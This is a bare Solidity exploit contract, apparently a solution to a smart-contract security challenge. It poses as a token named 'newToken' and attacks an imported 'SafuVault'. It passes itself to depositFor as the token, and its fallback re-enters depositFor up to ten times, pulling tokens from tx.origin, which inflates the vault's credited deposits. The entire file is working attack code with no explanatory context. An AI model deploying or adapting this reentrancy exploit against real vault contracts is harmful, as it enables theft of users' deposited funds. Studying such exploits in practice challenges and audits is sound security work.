// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SafuVault.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
contract newToken {

    IERC20 e;
    SafuVault s;
    uint n;
    uint a = 1_000 ether;

    constructor(address _a, address _b){
        e = IERC20(_a);
        s = SafuVault(_b);
    }

    function att() public{
        s.depositFor(address(this), a, tx.origin);
    }

    fallback() external payable{
        if(n<10){
            n++;
            e.transferFrom(tx.origin, address(s), a);
            s.depositFor(address(this), a, tx.origin);
        }
    }

}